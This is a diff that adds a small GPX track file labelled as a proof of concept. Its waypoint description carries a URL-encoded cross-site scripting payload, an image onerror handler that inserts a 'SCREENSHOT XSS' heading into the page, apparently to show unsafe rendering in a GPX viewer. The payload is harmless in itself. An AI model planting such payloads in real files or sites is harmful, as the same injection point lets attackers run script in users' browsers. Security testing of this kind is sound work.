@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<gpx version="1.1" creator="poc" xmlns="http://www.topografix.com/GPX/1/1">
+  <wpt lat="12.7000" lon="65.8000">
+    <name>SCREENSHOTPOINT</name>
+    <desc>%3Cimg%20src%3Dx%20onerror%3D%22document.body.insertAdjacentHTML(%27afterbegin%27,%27%3Ch1%20id%3Dscreenshot-xss%3ESCREENSHOT%20XSS%3C%2Fh1%3E%27)%22%3E</desc>
+  </wpt>
+  <trk><name>screenshot</name><trkseg>
+    <trkpt lat="12.3456" lon="65.4321"><ele>1</ele></trkpt>
+    <trkpt lat="12.3466" lon="65.4331"><ele>2</ele></trkpt>
+  </trkseg></trk>
+</gpx>
